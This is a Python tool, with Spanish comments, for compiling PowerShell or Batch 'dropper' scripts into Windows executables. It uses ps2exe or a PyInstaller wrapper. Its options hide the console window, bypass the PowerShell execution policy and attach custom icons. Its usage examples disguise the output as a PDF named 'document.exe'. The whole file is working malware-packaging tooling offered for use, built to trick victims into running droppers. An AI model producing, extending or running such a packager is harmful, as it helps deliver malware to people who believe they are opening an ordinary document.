#!/usr/bin/env python3
"""
compile_dropper.py - Compilador de Droppers PowerShell/Batch a EXE con Icono

Convierte scripts de dropper a ejecutables con iconos personalizados.
Usa ps2exe para PowerShell o bat2exe para Batch.
"""

import argparse
import subprocess
import sys
import tempfile
from pathlib import Path


class DropperCompiler:
    """Compilador de droppers a EXE"""
    
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.script_dir = Path(__file__).parent
    
    def log(self, msg, level="info"):
        colors = {"info": "\033[36m", "success": "\033[92m", "warning": "\033[93m", "error": "\033[91m", "reset": "\033[0m"}
        icons = {"info": "🔧", "success": "✅", "warning": "⚠️", "error": "❌"}
        print(f"{icons.get(level, '')} {colors.get(level, '')}{msg}{colors['reset']}")
    
    def ensure_ps2exe(self):
        """Verificar/instalar ps2exe PowerShell module"""
        self.log("Verificando ps2exe...", "info")
        
        check_cmd = [
            "powershell", "-NoProfile", "-Command",
            "if (Get-Module -ListAvailable -Name ps2exe) { exit 0 } else { exit 1 }"
        ]
        
        result = subprocess.run(check_cmd, capture_output=True)
        
        if result.returncode == 0:
            self.log("ps2exe encontrado", "success")
            return True
        
        self.log("Instalando ps2exe...", "warning")
        
        install_cmd = [
            "powershell", "-NoProfile", "-Command",
            "Install-Module -Name ps2exe -Scope CurrentUser -Force"
        ]
        
        result = subprocess.run(install_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            self.log("ps2exe instalado", "success")
            return True
        else:
            self.log(f"Error instalando ps2exe: {result.stderr}", "error")
            return False
    
    def compile_powershell(self, ps1_path, output_exe, icon_path=None, noconsole=True):
        """Compilar PowerShell a EXE"""
        if not Path(ps1_path).exists():
            self.log(f"Script no encontrado: {ps1_path}", "error")
            return False
        
        self.log(f"Compilando {ps1_path} a {output_exe}...", "info")
        
        # Construir comando ps2exe
        cmd = [
            "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
            f"ps2exe -inputFile '{ps1_path}' -outputFile '{output_exe}'"
        ]
        
        # Añadir opciones
        if noconsole:
            cmd[-1] += " -noConsole"
        
        if icon_path and Path(icon_path).exists():
            cmd[-1] += f" -iconFile '{icon_path}'"
            self.log(f"Usando icono: {icon_path}", "info")
        
        if self.verbose:
            cmd[-1] += " -verbose"
        
        # Ejecutar compilación
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0 and Path(output_exe).exists():
            self.log(f"EXE generado: {output_exe}", "success")
            return True
        else:
            self.log(f"Error compilando: {result.stderr}", "error")
            return False
    
    def compile_batch_via_python(self, bat_path, output_exe, icon_path=None):
        """Compilar Batch a EXE usando PyInstaller con wrapper Python"""
        if not Path(bat_path).exists():
            self.log(f"Batch no encontrado: {bat_path}", "error")
            return False
        
        self.log(f"Compilando {bat_path} a {output_exe} (vía Python wrapper)...", "info")
        
        # Leer contenido del batch
        with open(bat_path, 'r', encoding='utf-8') as f:
            bat_content = f.read()
        
        # Crear wrapper Python temporal
        wrapper_code = f'''
import subprocess
import sys
import tempfile
import os

# Batch script embebido
BAT_SCRIPT = r"""
{bat_content}
"""

# Crear temporal y ejecutar
with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='utf-8') as f:
    f.write(BAT_SCRIPT)
    bat_path = f.name

try:
    # Ejecutar batch
    subprocess.run(['cmd', '/c', bat_path], shell=False)
finally:
    # Limpiar
    try:
        os.remove(bat_path)
    except:
        pass

sys.exit(0)
'''
        
        # Guardar wrapper
        wrapper_path = Path(bat_path).parent / f"{Path(bat_path).stem}_wrapper.py"
        with open(wrapper_path, 'w', encoding='utf-8') as f:
            f.write(wrapper_code)
        
        if self.verbose:
            self.log(f"Wrapper creado: {wrapper_path}", "info")
        
        # Compilar con PyInstaller
        pyinstaller_cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--name", Path(output_exe).stem,
            "--distpath", str(Path(output_exe).parent.resolve()),
            "--workpath", str((Path(output_exe).parent / "build").resolve()),
            "--specpath", str((Path(output_exe).parent / "build").resolve()),
        ]
        
        if icon_path and Path(icon_path).exists():
            pyinstaller_cmd.extend(["--icon", str(Path(icon_path).resolve())])
        
        pyinstaller_cmd.append(str(wrapper_path.resolve()))
        
        # Ejecutar
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
        
        # Limpiar wrapper
        wrapper_path.unlink(missing_ok=True)
        
        if result.returncode == 0 and Path(output_exe).exists():
            self.log(f"EXE generado: {output_exe}", "success")
            return True
        else:
            self.log(f"Error compilando: {result.stderr}", "error")
            return False


def main():
    parser = argparse.ArgumentParser(
        description="🔨 Compilador de Droppers a EXE con Icono",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Compilar PowerShell dropper con icono PDF
  python compile_dropper.py simple_dropper.ps1 -o document.exe -i pdf_icon.ico
  
  # Compilar Batch dropper sin consola
  python compile_dropper.py simple_dropper.bat -o file.exe --noconsole
  
  # Con icono y modo verboso
  python compile_dropper.py advanced_dropper.ps1 -o tool.exe -i custom.ico -v
        """
    )
    
    parser.add_argument('input', help='Script de entrada (.ps1 o .bat)')
    parser.add_argument('-o', '--output', required=True, help='Ejecutable de salida (.exe)')
    parser.add_argument('-i', '--icon', help='Archivo de icono (.ico)')
    parser.add_argument('--noconsole', action='store_true', help='Sin ventana de consola')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verboso')
    
    args = parser.parse_args()
    
    # Validar input
    input_path = Path(args.input)
    if not input_path.exists():
        print(f"❌ Error: {args.input} no encontrado")
        return 1
    
    # Detectar tipo
    compiler = DropperCompiler(verbose=args.verbose)
    
    if input_path.suffix.lower() == '.ps1':
        # PowerShell
        if not compiler.ensure_ps2exe():
            print("❌ No se pudo instalar ps2exe")
            print("💡 Instala manualmente: Install-Module ps2exe -Scope CurrentUser")
            return 1
        
        success = compiler.compile_powershell(
            args.input,
            args.output,
            icon_path=args.icon,
            noconsole=args.noconsole
        )
    
    elif input_path.suffix.lower() == '.bat':
        # Batch (via Python wrapper)
        print("💡 Batch se compilará usando wrapper Python + PyInstaller")
        print("   Asegúrate de tener PyInstaller: pip install pyinstaller")
        
        success = compiler.compile_batch_via_python(
            args.input,
            args.output,
            icon_path=args.icon
        )
    
    else:
        print(f"❌ Error: Tipo de archivo no soportado: {input_path.suffix}")
        print("   Tipos soportados: .ps1, .bat")
        return 1
    
    if success:
        print(f"\n✨ ¡Listo! Ejecutable compilado: {args.output}")
        
        # Mostrar tamaño
        size_mb = Path(args.output).stat().st_size / (1024 * 1024)
        print(f"📊 Tamaño: {size_mb:.2f} MB")
        
        return 0
    else:
        return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n⚠️  Operación cancelada")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Error inesperado: {e}")
        sys.exit(1)
